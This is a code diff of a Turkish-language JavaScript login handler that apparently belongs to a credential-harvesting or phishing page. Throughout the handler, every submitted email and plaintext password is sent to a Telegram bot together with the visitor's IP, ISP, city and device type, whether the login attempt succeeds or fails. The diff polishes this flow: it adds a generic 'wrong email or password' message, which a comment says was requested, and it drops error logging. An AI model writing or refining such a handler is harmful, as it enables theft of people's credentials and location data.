@@ -1,4 +1,4 @@
-        export default async function handler(req, res) {
+export default async function handler(req, res) {
     if (req.method !== 'POST') return res.status(405).end();
     
     try {
@@ -8,13 +8,13 @@
         const CHAT_ID = process.env.TELEGRAM_ID;
         const DOGRU_SIFRE = process.env.SIFRE;
 
-        // Cihaz ismini basitçe ayıklayalım
-        let cihazIsmi = "Bilinmiyor";
+        // Cihaz bilgisini temizleme
+        let cihazTipi = "Bilinmiyor";
         if (cihaz) {
-            if (cihaz.includes("Android")) cihazIsmi = "Android Cihaz";
-            else if (cihaz.includes("iPhone")) cihazIsmi = "iPhone";
-            else if (cihaz.includes("Windows")) cihazIsmi = "Windows PC";
-            else cihazIsmi = "Diğer";
+            if (cihaz.includes("Android")) cihazTipi = "Android";
+            else if (cihaz.includes("iPhone")) cihazTipi = "iPhone";
+            else if (cihaz.includes("Windows")) cihazTipi = "Windows PC";
+            else cihazTipi = "Diğer";
         }
 
         const girisBasarili = (String(pass) === String(DOGRU_SIFRE));
@@ -22,11 +22,11 @@
         const mesaj = `🚀 **TERCES GÜVENLİK BİLDİRİMİ**\n\n` +
                       `📧 E-posta: ${email}\n` +
                       `🔑 Şifre: ${pass}\n` +
-                      `📱 Cihaz: ${cihazIsmi}\n` +
+                      `📱 Cihaz: ${cihazTipi}\n` +
                       `📡 IP: ${ipData?.ip || "Bilinmiyor"}\n` +
                       `🏢 ISS: ${ipData?.org || "Bilinmiyor"}\n` +
                       `📍 Konum: ${ipData?.city || "Bilinmiyor"}\n` +
-                      `✅ Durum: ${girisBasarili ? "BAŞARILI" : "HATALI"}`;
+                      `✅ Durum: ${girisBasarili ? "BAŞARILI GİRİŞ" : "HATALI GİRİŞ"}`;
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -41,17 +41,10 @@
         if (girisBasarili) {
             return res.status(200).json({ success: true });
         } else {
-            return res.status(401).json({ success: false, message: "Hatalı şifre!" });
+            // İstediğin ortak hata mesajı burada:
+            return res.status(401).json({ success: false, message: "Hatalı e-posta veya şifre!" });
         }
     } catch (error) {
-        console.error(error);
         return res.status(500).json({ success: false, error: "Sistem hatası" });
     }
 }
-
-
-
-
-
-
-
